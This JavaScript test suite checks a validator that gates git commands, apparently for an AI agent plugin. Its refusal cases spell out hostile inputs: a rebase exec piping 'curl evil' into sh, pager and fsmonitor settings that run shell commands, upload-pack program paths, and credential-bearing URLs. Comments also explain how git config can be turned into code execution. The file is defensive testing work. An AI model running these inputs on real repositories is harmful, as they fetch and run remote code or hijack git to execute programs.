/**
 * Tests for the enforcement gate: the catalog, the argument validator, the
 * environment builder, and command composition.
 *
 * These are the assertions that matter — everything else in this plugin is
 * presentation. Run them with `npm test` (Node's built-in test runner, no
 * dependencies).
 *
 * @module git-for-dsh/test/git-catalog.test
 */
import assert from 'node:assert/strict'
import { describe, it } from 'node:test'
import {
  DEFAULT_ENABLED,
  ENFORCED_CONFIG,
  OPERATION_NAMES,
  RISK,
  buildEnv,
  composeCommand,
  containsNativeGit,
  createBudget,
  describeCatalog,
  DEFAULT_PROTECTION_ROWS,
  resolveProtectionRows,
  mentionsProtectedPath,
  reachesProtectedPath,
  hardenArgv,
  invokesGit,
  shellQuote,
  validateArgv,
} from '../src/git-catalog.js'

/** Assert a request is refused, and that the reason mentions something. */
function refused(argv, fragment) {
  const verdict = validateArgv(argv)
  assert.equal(verdict.ok, false, `expected refusal for ${JSON.stringify(argv)}`)
  if (fragment !== undefined) {
    assert.match(verdict.reason, fragment, `reason should mention ${fragment}: ${verdict.reason}`)
  }
}

/** Assert a request is accepted, and returns the named operation. */
function allowed(argv, expected) {
  const verdict = validateArgv(argv)
  assert.equal(verdict.ok, true, `expected acceptance for ${JSON.stringify(argv)}: ${verdict.reason}`)
  assert.equal(verdict.operation.name, expected)
  return verdict
}

describe('catalog', () => {
  it('has no duplicate operation names', () => {
    assert.equal(new Set(OPERATION_NAMES).size, OPERATION_NAMES.length)
  })

  it('defaults to exactly the read tier', () => {
    for (const name of DEFAULT_ENABLED) assert.equal(catalogRisk(name), RISK.read, `${name} must be read-only`)
    const readCount = OPERATION_NAMES.filter((name) => catalogRisk(name) === RISK.read).length
    assert.equal(DEFAULT_ENABLED.length, readCount)
  })

  it('ships every tier the settings page renders, with titles', () => {
    const tiers = describeCatalog()
    assert.deepEqual(
      tiers.map((tier) => tier.risk),
      [RISK.read, RISK.write, RISK.remote],
    )
    for (const tier of tiers) {
      assert.ok(tier.title.length > 0, `${tier.risk} needs a title`)
      assert.ok(tier.groups.length > 0, `${tier.risk} needs at least one group`)
    }
  })

  it('gives every operation a label for the settings page', () => {
    for (const tier of describeCatalog()) {
      for (const group of tier.groups) {
        for (const operation of group.operations) {
          assert.ok(operation.label.length > 0, `${operation.name} needs a label`)
        }
      }
    }
  })
})

/** Risk tier of one catalog name; the test-local mirror of the Host lookup. */
function catalogRisk(name) {
  for (const tier of describeCatalog()) {
    for (const group of tier.groups) {
      if (group.operations.some((operation) => operation.name === name)) return tier.risk
    }
  }
  throw new Error(`unknown operation ${name}`)
}

describe('validateArgv: acceptance', () => {
  it('accepts a bare known subcommand', () => {
    allowed(['status'], 'status')
    allowed(['log'], 'log')
  })

  it('accepts flags', () => {
    allowed(['status', '--porcelain', '-b'], 'status')
    allowed(['log', '--oneline', '-n', '20'], 'log')
    allowed(['diff', '--stat'], 'diff')
  })

  it('accepts positional arguments for operations that declare them', () => {
    allowed(['config', '--get', 'user.email'], 'config')
    allowed(['log', 'main..feature'], 'log')
    allowed(['show', 'HEAD~3'], 'show')
  })

  it('accepts paths for a path-taking operation', () => {
    allowed(['add', 'src/app.js'], 'add')
    allowed(['restore', '--staged', 'src'], 'restore')
  })

  it('accepts everything after -- without flag interpretation', () => {
    allowed(['add', '--', '--weird-file-name'], 'add')
  })
})

describe('a short flag means what the SUBCOMMAND says it means', () => {
  // Found by the live end-to-end test: a blanket refusal of `-c`/`-C`/`-u` blocked
  // everyday operations. Measured with git 2.55, a global option is honoured ONLY
  // before the subcommand (`git status -C <repo>` answers "unknown option"), and
  // that position is already blocked by the first-argument rule.
  it('allows the legitimate short flags of an allowlisted subcommand', () => {
    allowed(['switch', '-c', 'newbranch'], 'switch')
    allowed(['checkout', '-b', 'newbranch'], 'checkout')
    allowed(['branch', '-c', 'a', 'b'], 'branch')
    allowed(['commit', '-C', 'HEAD'], 'commit')
    allowed(['commit', '-c', 'HEAD'], 'commit')
    allowed(['add', '-u'], 'add')
    allowed(['init', '--bare'], 'init')
    allowed(['clone', '--bare', 'https://example.invalid/x.git'], 'clone')
  })

  it('still refuses them in the GLOBAL position', () => {
    // The only position git honours them in, and the only dangerous one.
    refused(['-c', 'core.pager=sh -c evil', 'status'], /must be a git subcommand/)
    refused(['-C', '/elsewhere', 'status'], /must be a git subcommand/)
    refused(['--git-dir=/elsewhere/.git', 'status'], /must be a git subcommand/)
    refused(['--bare', 'status'], /must be a git subcommand/)
  })

  it('still refuses the program-naming form where it applies', () => {
    refused(['fetch', '-u', '/tmp/evil', 'origin'], /names a program/)
    refused(['pull', '-u', '/tmp/evil'], /names a program/)
    refused(['ls-remote', '-u', '/tmp/evil', 'origin'], /names a program/)
    refused(['fetch', '--upload-pack=/tmp/evil', 'origin'], /names a program/)
  })
})

describe('credentials may not travel in argv', () => {
  // `git push https://user:token@host/…` was accepted, which put the secret into the
  // approval prompt and the session log — the tool acting as the leak path it
  // promises never to be.
  it('refuses a URL with embedded credentials', () => {
    refused(['push', 'https://user:ghp_EXAMPLE@github.com/o/r.git', 'main'], /embedded credentials/)
    refused(['clone', 'https://ghp_EXAMPLE@github.com/o/r.git'], /embedded credentials/)
    refused(['ls-remote', 'https://x-access-token:ghp_EXAMPLE@github.com/o/r.git'], /embedded credentials/)
  })

  it('refuses it in the URL forms that look least like a URL', () => {
    refused(['fetch', 'https://a:b@example.invalid/repo.git'], /embedded credentials/)
    refused(['pull', 'ssh://user:pw@example.invalid/repo.git'], /embedded credentials/)
  })

  it('leaves ordinary remotes alone', () => {
    allowed(['push', 'origin', 'main'], 'push')
    allowed(['clone', 'https://github.com/owner/repo.git', '/tmp/probe'], 'clone')
    // scp-like SSH syntax has no userinfo field, and `git@` is a user name, not a secret.
    allowed(['ls-remote', 'git@github.com:owner/repo.git'], 'ls-remote')
  })
})

describe('config is read-only', () => {
  it('accepts the read forms', () => {
    allowed(['config', 'user.name'], 'config')
    allowed(['config', '--get', 'user.name'], 'config')
    allowed(['config', '--get-regexp', '^user\\.'], 'config')
    allowed(['config', '--list'], 'config')
  })

  it('refuses the two-operand write form', () => {
    // The first half of both code-execution reproductions: this wrote
    // `core.fsmonitor` / `diff.<driver>.command`, which a later read-only
    // subcommand then executed.
    refused(['config', 'user.name', 'X'], /READ forms/)
    refused(['config', '--local', 'core.fsmonitor', 'sh -c evil'], /READ forms/)
    refused(['config', '--local', 'diff.evil.command', 'sh -c evil'], /READ forms/)
  })

  it('refuses every writing or file-selecting flag', () => {
    refused(['config', '--unset', 'user.name'], /READ forms/)
    refused(['config', '--unset-all', 'user.name'], /READ forms/)
    refused(['config', '--add', 'x.y', 'z'], /READ forms/)
    refused(['config', '--replace-all', 'x.y', 'z'], /READ forms/)
    refused(['config', '--rename-section', 'a', 'b'], /READ forms/)
    refused(['config', '--remove-section', 'a'], /READ forms/)
    refused(['config', '--edit'], /READ forms/)
    refused(['config', '-e'], /READ forms/)
    refused(['config', '-f', '/etc/passwd', '--list'], /READ forms/)
  })
})

describe('the native-git matchers differ on purpose', () => {
  // 禁止 (broad) refuses a mere mention; 限制 (narrow) requires a command position.
  // Both behaviours are asserted, because the operator chooses between the two errors.
  it('the broad matcher catches a mention', () => {
    assert.equal(containsNativeGit('echo "(请看 git 的状态)"'), true)
    assert.equal(containsNativeGit('git status'), true)
  })

  it('the narrow matcher catches every real invocation form', () => {
    for (const command of [
      'git status',
      'sudo git push',
      'env git status',
      'cd x && git log',
      'echo x; git commit -m y',
      '$(git rev-parse HEAD)',
      'sh -c "git status"',
      'for f in *; do git add $f; done',
      '/usr/bin/git log',
      'git.exe status',
      'git-credential-store get',
      'xargs git add',
    ]) {
      assert.equal(invokesGit(command), true, command + ' must be refused')
    }
  })

  it('the narrow matcher does not refuse a mention', () => {
    // This is the whole reason the tier exists: it refused the author's own review
    // script merely for containing the word.
    for (const command of [
      'echo "use git here"',
      'echo "(用 git 查)"',
      'grep -rn "git" .',
      'cat notes-about-git.txt',
      'echo digit',
      'cat .gitignore',
      'cd /mnt/d/AIproject/DSHplugins/git-for-dsh',
      'printf %s "git is a vcs"',
    ]) {
      assert.equal(invokesGit(command), false, command + ' must be allowed')
    }
  })
})

describe('a read-tier operation can have a mutating FORM', () => {
  // Found by the live end-to-end run: `remote add`, `branch <name>` and
  // `tag <name>` are read-tier operations that were running WITHOUT approval while
  // writing .git/config and creating refs.
  const mutating = (argv) => {
    const verdict = validateArgv(argv)
    assert.equal(verdict.ok, true, `expected ${argv.join(' ')} to be accepted: ${verdict.reason}`)
    return verdict.mutating === true
  }

  it('branch: listing is a read, naming a ref is not', () => {
    assert.equal(mutating(['branch']), false)
    assert.equal(mutating(['branch', '-a', '-v']), false)
    assert.equal(mutating(['branch', '--list', 'feature/*']), false)
    assert.equal(mutating(['branch', 'newbranch']), true)
    assert.equal(mutating(['branch', '-d', 'oldbranch']), true)
    assert.equal(mutating(['branch', '-m', 'a', 'b']), true)
  })

  it('tag: listing is a read, creating or deleting is not', () => {
    assert.equal(mutating(['tag']), false)
    assert.equal(mutating(['tag', '-l', 'v*']), false)
    assert.equal(mutating(['tag', 'v1.0.0']), true)
    assert.equal(mutating(['tag', '-a', 'v1.0.0', '-m', 'release']), true)
    assert.equal(mutating(['tag', '-d', 'v1.0.0']), true)
  })

  it('remote: reading is a read, maintenance is a write, config verbs are refused', () => {
    assert.equal(mutating(['remote']), false)
    assert.equal(mutating(['remote', '-v']), false)
    assert.equal(mutating(['remote', 'show', 'origin']), false)
    assert.equal(mutating(['remote', 'get-url', 'origin']), false)
    assert.equal(mutating(['remote', 'prune', 'origin']), true)
    assert.equal(mutating(['remote', 'update']), true)

    // These rewrite .git/config, so they are refused like a config write rather
    // than gated: `set-url` silently redirects where a later push goes, and that
    // push's approval prompt would show the command, not the URL.
    for (const verb of ['add', 'remove', 'rm', 'rename', 'set-url', 'set-head', 'set-branches']) {
      refused(['remote', verb, 'origin', 'value'], /READ forms/)
    }
  })
})

describe('operand declarations match real usage', () => {
  it('accepts the ordinary form of the inspection subcommands', () => {
    allowed(['ls-tree', 'HEAD'], 'ls-tree')
    allowed(['for-each-ref', 'refs/heads'], 'for-each-ref')
    allowed(['name-rev', 'HEAD'], 'name-rev')
  })
})

describe('clone', () => {
  it('is in the catalog, remote tier, and off by default', () => {
    const verdict = allowed(['clone', 'https://example.invalid/x.git'], 'clone')
    assert.equal(verdict.operation.risk, RISK.remote)
    assert.equal(verdict.operation.remote, true)
    assert.ok(!DEFAULT_ENABLED.includes('clone'), 'clone must not be enabled by default')
  })
})

describe('diff drivers cannot be re-enabled by the caller', () => {
  it('refuses --ext-diff and --textconv', () => {
    refused(['diff', '--ext-diff'], /re-enables an external diff/)
    refused(['log', '--textconv'], /re-enables an external diff/)
    refused(['show', '--ext-diff'], /re-enables an external diff/)
  })
})

describe('hardenArgv', () => {
  it('inserts the anti-driver flags for diff-producing subcommands', () => {
    assert.deepEqual(hardenArgv(['diff', '--stat', 'a.txt']), ['diff', '--no-ext-diff', '--no-textconv', '--stat', 'a.txt'])
    assert.deepEqual(hardenArgv(['log', '--oneline']), ['log', '--no-ext-diff', '--no-textconv', '--oneline'])
    assert.deepEqual(hardenArgv(['show', 'HEAD']), ['show', '--no-ext-diff', '--no-textconv', 'HEAD'])
  })

  it('keeps the flags on the option side of an explicit --', () => {
    assert.deepEqual(hardenArgv(['diff', '--', 'a.txt']), ['diff', '--no-ext-diff', '--no-textconv', '--', 'a.txt'])
  })

  it('leaves other subcommands untouched', () => {
    assert.deepEqual(hardenArgv(['status', '--porcelain']), ['status', '--porcelain'])
    assert.deepEqual(hardenArgv(['commit', '-m', 'x']), ['commit', '-m', 'x'])
  })
})

describe('shell quoting follows the shell that parses it', () => {
  it('leaves ordinary tokens bare, and quotes a comma', () => {
    assert.equal(shellQuote('status'), 'status')
    assert.equal(shellQuote('--short'), '--short')
    // PowerShell reads a bare comma as an array separator, so this must be quoted.
    assert.equal(shellQuote('--pretty=%h,%s'), "'--pretty=%h,%s'")
  })

  it('escapes an embedded quote the way that shell does', () => {
    assert.equal(shellQuote("it's", 'sh'), "'it'\\''s'")
    assert.equal(shellQuote("it's", 'pwsh'), "'it''s'")
  })

  it('keeps a path with a space or an expansion character literal in both', () => {
    for (const dialect of ['sh', 'pwsh']) {
      assert.equal(shellQuote('C:/my docs/x', dialect), "'C:/my docs/x'")
      assert.equal(shellQuote('a$b', dialect), "'a$b'")
      assert.equal(shellQuote('a\\b', dialect), "'a\\b'")
    }
  })
})

describe('a path mention is judged without refusing ordinary work', () => {
  const builtins = ['~/.gitconfig', '~/.config/git/config', '~/.git-credentials']

  it('does not fire on a common basename', () => {
    // The defect this replaced: the basename of ~/.config/git/config is "config", so a
    // substring test refused every command containing that word — including these.
    assert.equal(mentionsProtectedPath('git config --global user.name', builtins), false)
    assert.equal(mentionsProtectedPath('git config --list --show-origin', builtins), false)
  })

  it('still catches the dotfile basename and the full path', () => {
    assert.equal(mentionsProtectedPath('cat .gitconfig', builtins), true)
    assert.equal(mentionsProtectedPath('cat ~/.gitconfig', builtins), true)
    assert.equal(mentionsProtectedPath('cp ~/.config/git/config /tmp/x', builtins), true)
    assert.equal(mentionsProtectedPath('cat .git-credentials', builtins), true)
  })

  it('leaves an unrelated command alone', () => {
    assert.equal(mentionsProtectedPath('npm test 2>&1 | tail -3', builtins), false)
  })
})

describe('the blacklist rows come from the stored document or the defaults', () => {
  const rowFor = (rows, path) => rows.find((row) => row.path === path)

  it('gives the built-in rows, all unticked, when nothing is stored', () => {
    const rows = resolveProtectionRows({})
    assert.deepEqual(rows, DEFAULT_PROTECTION_ROWS)
  })

  it('keeps a stored row exactly as it is', () => {
    const rows = resolveProtectionRows({ pathRules: [{ path: '/x', read: true, write: false, ask: true }] })
    const own = rowFor(rows, '/x')
    assert.deepEqual([own.read, own.write, own.ask, own.builtin], [true, false, true, false])
  })

  it('never loses a built-in row', () => {
    const rows = resolveProtectionRows({ pathRules: [{ path: '/x', read: true, write: false, ask: false }] })
    assert.equal(rows.length, DEFAULT_PROTECTION_ROWS.length + 1)
    for (const row of DEFAULT_PROTECTION_ROWS) {
      assert.deepEqual(rowFor(rows, row.path), row, row.path + ' must survive unchanged')
    }
  })
})

describe('a command word is recognised in either platform spelling', () => {
  // Built from its code point so no escaping layer can quietly change what is tested.
  const bs = String.fromCharCode(92)
  const winGit = "C:" + bs + "Program Files" + bs + "Git" + bs + "cmd" + bs + "git.exe"

  it('catches the Windows forms', () => {
    assert.equal(containsNativeGit('"' + winGit + '" status'), true)
    assert.equal(containsNativeGit('.' + bs + 'git status'), true)
    assert.equal(containsNativeGit('git.exe status'), true)
  })

  it('still leaves a name that merely contains git alone', () => {
    assert.equal(containsNativeGit('node_modules/git/thing'), false)
    assert.equal(containsNativeGit('my-git-script run'), false)
    assert.equal(containsNativeGit('git-for-dsh run'), false)
  })
})

describe('the matcher always terminates', () => {
  // The freeze, as a test. Before the fix each of these spun forever inside the guard, so
  // the suite hanging IS the failure — and `--test-timeout` in package.json turns that into
  // a report instead of a hang.
  it('handles every redirection form without looping', () => {
    assert.equal(invokesGit('echo x > y'), false)
    assert.equal(invokesGit('echo x < y'), false)
    assert.equal(invokesGit('make 2>&1'), false)
    assert.equal(invokesGit('npm test 2>/dev/null'), false)
    assert.equal(invokesGit('cat < in > out'), false)
    assert.equal(invokesGit('echo a >> b'), false)
  })

  it('still sees git on either side of a redirection', () => {
    assert.equal(invokesGit('git status > out.txt'), true)
    assert.equal(invokesGit('echo hi > log; git push'), true)
    assert.equal(invokesGit('npm test 2>&1 | grep x'), false)
    assert.equal(invokesGit('git log 2>&1 | head -3'), true)
  })

  it('terminates on awkward shapes', () => {
    // Whatever the shape, the scanner must consume input: a future branch that forgets
    // this would hang the harness again.
    for (const command of ['', ' ', '>>>', '<<<', '=>', 'a<>b', '""', "''", '-c', 'x -c']) {
      assert.equal(typeof invokesGit(command), 'boolean', JSON.stringify(command))
    }
  })
})

describe('every scan is bounded', () => {
  // The mechanism that makes a hang inside the guard impossible rather than unlikely: a
  // counter the loops consult. A timer cannot do this job — nothing on the event loop runs
  // while a synchronous loop spins, which is exactly how the freeze looked.
  it('exhausts a budget and stops spending', () => {
    const budget = createBudget(10)
    assert.equal(budget.exhausted(), false)
    assert.equal(budget.spend(9), true)
    assert.equal(budget.exhausted(), false)
    assert.equal(budget.spend(5), false)
    assert.equal(budget.exhausted(), true)
  })

  it('stops a scan when the budget runs out, whatever the input', () => {
    const budget = createBudget(50)
    assert.equal(typeof invokesGit('echo ' + 'a'.repeat(5000), budget.spend), 'boolean')
    assert.equal(budget.exhausted(), true, 'the scan really did stop early')

    const other = createBudget(50)
    assert.equal(typeof containsNativeGit('git' + 'g'.repeat(5000), other.spend), 'boolean')
    assert.equal(other.exhausted(), true)
  })

  it('terminates on inputs that used to cost quadratic time', () => {
    // isCommandStringQuote used to copy everything before each quote: quadratic, and on a
    // command full of quotes that was thousands of megabytes of copying.
    assert.equal(invokesGit('"'.repeat(20000)), false)
    assert.equal(invokesGit("'".repeat(20000)), false)
    assert.equal(containsNativeGit('git' + 'g'.repeat(100000)), false)
  })
})

describe('enforced configuration pins the program-naming keys', () => {
  it('neutralizes every key that names a program', () => {
    const pinned = new Map(ENFORCED_CONFIG.map((pair) => [pair.key, pair.value]))
    // `core.fsmonitor` made `git status` execute a configured program, and
    // `core.gitProxy` names a program for transport.
    assert.equal(pinned.get('core.fsmonitor'), 'false')
    assert.equal(pinned.get('core.gitProxy'), 'false')
    assert.equal(pinned.get('core.hooksPath'), '/dev/null')
    assert.equal(pinned.get('core.pager'), 'cat')
    assert.equal(pinned.get('credential.helper'), '')
  })

  it('keeps a Windows path usable through the shell that parses it', () => {
    // The reported failure: an unquoted backslash path lost every separator to shell
    // escaping and git answered "command not found" for C:WindowsSystem32OpenSSHssh.exe.
    const env = buildEnv({ sshCommand: 'C:\\Windows\\System32\\OpenSSH\\ssh.exe' })
    assert.match(env.GIT_SSH_COMMAND, /^"C:\/Windows\/System32\/OpenSSH\/ssh\.exe" /)
    assert.ok(!env.GIT_SSH_COMMAND.includes('\\'), 'no backslash survives into the command')
  })

  it('quotes a path with a space, whatever the platform', () => {
    // A macOS install under /Applications, or Git for Windows under Program Files.
    const env = buildEnv({ sshCommand: '/Applications/Some App/bin/ssh' })
    assert.match(env.GIT_SSH_COMMAND, /^'\/Applications\/Some App\/bin\/ssh' /)
  })

  it('pins the ssh program through the ENVIRONMENT instead', () => {
    // `core.sshCommand=false` made SSH impossible, so a repository offering only an SSH
    // remote had no route at all. GIT_SSH_COMMAND outranks every config file, which is
    // the same protection with SSH still usable — and it is non-interactive, because the
    // tool's GIT_TERMINAL_PROMPT does not cover ssh.
    const env = buildEnv({ sshCommand: '/opt/ssh' })
    // A path needing no quoting is left bare, which is the shared quoting rule's fast path.
    assert.equal(env.GIT_SSH_COMMAND, '/opt/ssh -o BatchMode=yes -o StrictHostKeyChecking=accept-new')
    assert.equal(ENFORCED_CONFIG.some((pair) => pair.key === 'core.sshCommand'), false)
    // A blank setting falls back rather than pinning an empty program.
    assert.match(buildEnv({ sshCommand: '   ' }).GIT_SSH_COMMAND, /^\/usr\/bin\/ssh -o BatchMode=yes/)
  })
})

describe('a credential URL is refused in any position', () => {
    const url = 'https://alice:s3cr3t@example.com/team/repo.git'

    it('refuses it before and after the separator', () => {
      refused(['clone', url], /embedded credentials/)
      refused(['clone', '--', url], /embedded credentials/)
      refused(['fetch', '--', url], /embedded credentials/)
    })

    it('names the leak without repeating the secret', () => {
      const verdict = validateArgv(['clone', '--', url])
      assert.equal(verdict.ok, false)
      assert.ok(!verdict.reason.includes('s3cr3t'), 'the message must not carry the secret')
      assert.match(verdict.reason, /<credentials>/)
    })

    it('still allows a pathspec that begins with a dash', () => {
      const verdict = validateArgv(['log', '--', '-weird-name.txt'])
      assert.equal(verdict.ok, true)
    })
  })

  describe('clone cannot inject configuration into the new repository', () => {
    it('refuses the config options on clone itself', () => {
      refused(['clone', '-c', 'filter.p.smudge=/tmp/payload', 'file:///r', 'dest'], /clone -c/)
      refused(['clone', '--config', 'core.attributesFile=/tmp/attrs', 'r', 'd'], /clone -c/)
      refused(['clone', '--config-env', 'core.pager=EVIL', 'r', 'd'], /refused/)
    })

    it('still runs a plain clone', () => {
      assert.equal(validateArgv(['clone', 'https://example.com/team/repo.git', 'dest']).ok, true)
    })
  })

  describe('rebase cannot name a program to run', () => {
    it('refuses both spellings of the exec option', () => {
      refused(['rebase', '-x', 'curl evil|sh', 'origin/main'], /program/)
      refused(['rebase', '--exec=curl evil|sh', 'origin/main'], /program/)
    })

    it('still runs a plain rebase', () => {
      assert.equal(validateArgv(['rebase', 'origin/main']).ok, true)
      assert.equal(validateArgv(['rebase', '--interactive', 'origin/main']).ok, true)
    })
  })

  describe('a protected directory covers what is inside it', () => {
    const dir = '/home/me/private'

    it('reaches a file inside the entry, and the entry itself, and an ancestor', () => {
      assert.equal(reachesProtectedPath(dir + '/secret.txt', [dir]), dir)
      assert.equal(reachesProtectedPath(dir, [dir]), dir)
      assert.equal(reachesProtectedPath('/home/me', [dir]), dir)
    })

    it('does not reach a sibling that merely shares a prefix', () => {
      assert.equal(reachesProtectedPath(dir + '2/other.txt', [dir]), undefined)
      assert.equal(reachesProtectedPath('/home/me/priv', [dir]), undefined)
    })
  })

  describe('validateArgv: refusals', () => {
  it('refuses an empty or malformed request', () => {
    refused([], /non-empty array/)
    refused(['status', 3], /must be a string/)
    refused('status', /non-empty array/)
  })

  it('refuses an unknown subcommand', () => {
    refused(['frobnicate'], /unknown git subcommand/)
    refused(['commit-tree'], /unknown git subcommand/)
  })

  it('refuses a leading option as the subcommand', () => {
    refused(['--version'], /must be a git subcommand/)
  })

  it('refuses config injection in the GLOBAL position only', () => {
    // Measured with git 2.55: after a subcommand, `-c` is that subcommand's own
    // flag (or an unknown option git rejects itself), never a global one. The
    // blanket rule this replaces blocked `switch -c`, `commit -C` and `add -u`.
    refused(['-c', 'core.pager=sh -c evil', 'status'], /must be a git subcommand/)
    refused(['log', '--config-env=core.pager=EVIL'], /refused/)
    refused(['log', '--config-env', 'core.pager=EVIL'], /refused/)
  })

  it('refuses repository-redirecting global options in the global position', () => {
    for (const option of ['-C', '--git-dir', '--work-tree', '--exec-path', '--bare']) {
      refused([option, '/elsewhere', 'status'], /must be a git subcommand/)
    }
  })

  it('refuses the long forms after a subcommand too, where nothing collides', () => {
    // These have no meaning as a subcommand flag, so refusing them there is free
    // defence-in-depth for a git version that might honour them later.
    for (const option of ['--git-dir', '--work-tree', '--exec-path']) {
      refused(['status', option, '/elsewhere'], /refused/)
    }
  })

  it('refuses the = forms of the same options', () => {
    refused(['status', '--git-dir=/elsewhere/.git'], /refused/)
    refused(['status', '--work-tree=/elsewhere'], /refused/)
    refused(['status', '--exec-path=/tmp/evil'], /refused/)
  })

  it('refuses an option that names a program for git to run', () => {
    refused(['ls-remote', '--upload-pack=/tmp/evil', 'origin'], /names a program/)
    refused(['fetch', '--upload-pack=/tmp/evil', 'origin'], /names a program/)
    refused(['fetch', '--upload-pack', '/tmp/evil', 'origin'], /names a program/)
    refused(['push', '--receive-pack=/tmp/evil', 'origin'], /names a program/)
  })

  it('refuses trailing operands for operations that declare none', () => {
    refused(['count-objects', 'bogus'], /does not accept a trailing operand/)
    refused(['ls-files', 'bogus'], /does not accept a trailing operand/)
    refused(['ls-files', '--stage', 'bogus'], /does not accept a trailing operand/)
  })

  it('accepts flags for the flag-only operations', () => {
    allowed(['count-objects', '-v'], 'count-objects')
    allowed(['ls-files', '--stage'], 'ls-files')
  })
})

describe('buildEnv', () => {
  it('forces the hazardous configuration keys through the environment', () => {
    const env = buildEnv()
    const pairs = new Map()
    for (let index = 0; index < Number(env.GIT_CONFIG_COUNT); index += 1) {
      pairs.set(env[`GIT_CONFIG_KEY_${index}`], env[`GIT_CONFIG_VALUE_${index}`])
    }
    assert.equal(pairs.get('core.pager'), 'cat')
    assert.equal(pairs.get('core.hooksPath'), '/dev/null')
    assert.equal(pairs.get('credential.helper'), '')
  })

  it('hides the user and system configuration by default', () => {
    const env = buildEnv()
    assert.equal(env.GIT_CONFIG_GLOBAL, '/dev/null')
    assert.equal(env.GIT_CONFIG_SYSTEM, '/dev/null')
  })

  it('always hides the user and system configuration', () => {
    // There is no option to reach them: stored credentials stay unusable either
    // way, and reading ~/.gitconfig would make behaviour depend on a file outside
    // the repository while exposing whatever it holds.
    const env = buildEnv()
    assert.equal(env.GIT_CONFIG_GLOBAL, '/dev/null')
    assert.equal(env.GIT_CONFIG_SYSTEM, '/dev/null')
  })

  it('never prompts or pager-waits', () => {
    const env = buildEnv()
    assert.equal(env.GIT_TERMINAL_PROMPT, '0')
    assert.equal(env.GIT_PAGER, 'cat')
    assert.equal(env.GIT_EDITOR, 'true')
    assert.equal(env.GIT_ASKPASS, '')
  })
})

describe('command composition', () => {
  it('quotes tokens that need it', () => {
    assert.equal(shellQuote('status'), 'status')
    assert.equal(shellQuote('fix: typo'), "'fix: typo'")
    assert.equal(shellQuote("it's"), `'it'\\''s'`)
    assert.equal(shellQuote(''), "''")
    assert.equal(shellQuote('--oneline'), '--oneline')
    assert.equal(shellQuote('src/a b.js'), "'src/a b.js'")
  })

  it('composes an argv that survives spaces and glob characters', () => {
    assert.equal(composeCommand(['add', '--', 'a b.js']), `git add -- 'a b.js'`)
    assert.equal(composeCommand(['log', '-n', '5']), 'git log -n 5')
  })
})
